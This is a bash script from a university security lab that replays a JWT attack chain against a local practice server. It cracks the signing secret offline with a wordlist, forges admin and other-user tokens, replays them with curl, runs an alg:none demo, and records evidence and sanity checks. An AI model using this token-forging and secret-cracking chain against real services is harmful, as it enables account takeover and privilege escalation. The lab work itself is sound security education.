#!/usr/bin/env bash
# Part 2 evidence runner for Lab Extra 5 (JWT). Pure stdlib, no Docker.
# Run from the worktree root (Linux / WSL):  bash <this script>
# Starts the target on PORT, replays the R1-R3 chain, the sanity controls,
# and the dedicated alg:none demo, writing raw output under evidencia/salidas/.
set -u
PORT=8099
G=entregas/labextra5/grupo08
S=$G/evidencia/salidas
DICC=labs/labextra5-jwt/caso/diccionario.txt

PORT=$PORT python3 labs/labextra5-jwt/objetivo/server.py >/tmp/srv5.log 2>&1 &
SRV=$!
for _ in $(seq 1 25); do curl -s -o /dev/null "http://127.0.0.1:$PORT/" && break; sleep 0.2; done
U="http://127.0.0.1:$PORT"

TOK=$(curl -s "$U/login?user=diego&pass=diego123" | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
ADMIN=$(python3 $G/src/jwt_tool.py forjar mate123 --sub diego --role admin)
MARIA=$(python3 $G/src/jwt_tool.py forjar mate123 --sub maria --role user)
CORR="${ADMIN%?}X"   # same token with the last signature char changed

{
  echo "### R1 - token real de diego (claim nota_interna no deberia viajar)"
  echo "$TOK"; echo
  python3 $G/src/jwt_tool.py decodificar "$TOK"; echo
  echo "### R2a - crack offline del secreto"
  python3 $G/src/jwt_tool.py crackear "$TOK" "$DICC"; echo
  echo "### R2b - forja role=admin -> /admin"
  echo "token: $ADMIN"
  curl -s -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $ADMIN" "$U/admin"; echo
  echo "### R3 - forja sub=maria -> /perfil"
  echo "token: $MARIA"
  curl -s -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $MARIA" "$U/perfil"
} > "$S/10-parte2-cadena.txt" 2>&1

{
  echo "### Sanidad (a): token REAL de diego (role=user) contra /admin -> 403"
  curl -s -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $TOK" "$U/admin"; echo
  echo "### Sanidad (b): token forjado admin con 1 char cambiado en la firma -> 401"
  curl -s -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $CORR" "$U/admin"
} > "$S/11-parte2-sanidad.txt" 2>&1

PORT=$PORT python3 $G/evidencia/scripts/parte2-alg-none.py > "$S/12-parte2-alg-none.txt" 2>&1

# P2 reproducible timing of the offline crack (no server contact)
python3 $G/evidencia/scripts/parte2-medir-crack.py "$TOK" "$DICC" > "$S/13-parte2-medicion-crack.txt" 2>&1

kill $SRV 2>/dev/null
echo "listo"
